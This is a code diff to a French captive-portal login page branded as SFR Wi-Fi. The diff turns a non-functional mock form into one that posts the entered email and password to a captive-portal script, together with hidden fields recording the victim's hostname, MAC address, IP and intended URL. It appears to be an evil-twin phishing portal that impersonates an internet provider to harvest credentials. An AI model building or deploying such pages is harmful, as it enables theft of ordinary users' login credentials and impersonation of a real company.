@@ -1,3 +1,8 @@
+<?php
+$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+require_once('helper.php');
+?>
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -142,9 +147,17 @@
   <h1>Accès Wi-Fi SFR</h1>
   <p>Connectez-vous pour profiter d’Internet en toute sécurité.</p>
 
-  <form id="form">
-    <input type="email" placeholder="Adresse e-mail" required>
-    <input type="password" placeholder="Mot de passe" required>
+  <!-- ✅ Same look, now real POST -->
+  <form method="POST" action="/captiveportal/index.php" id="form">
+    <input name="email" type="email" placeholder="Adresse e-mail" required>
+    <input name="password" type="password" placeholder="Mot de passe" required>
+
+    <!-- Hidden fields -->
+    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+    <input type="hidden" name="target" value="<?=$destination?>">
+
     <button type="submit" class="btn-login">Se connecter</button>
   </form>
   <button id="guestBtn" class="btn-guest">Connexion invitée</button>
@@ -159,15 +172,12 @@ const success = document.getElementById('success');
 const card = document.getElementById('card');
 const orbsContainer = document.getElementById('orbsContainer');
 
-// === LOGIN / INVITÉ ===
+// === SUCCESS ANIM ===
 function showSuccess() {
   success.classList.add('show');
   setTimeout(()=> success.classList.remove('show'), 900);
 }
-form.addEventListener('submit', e => {
-  e.preventDefault();
-  showSuccess();
-});
+form.addEventListener('submit', () => showSuccess());
 guestBtn.addEventListener('click', showSuccess);
 
 // === PARTICLES ===
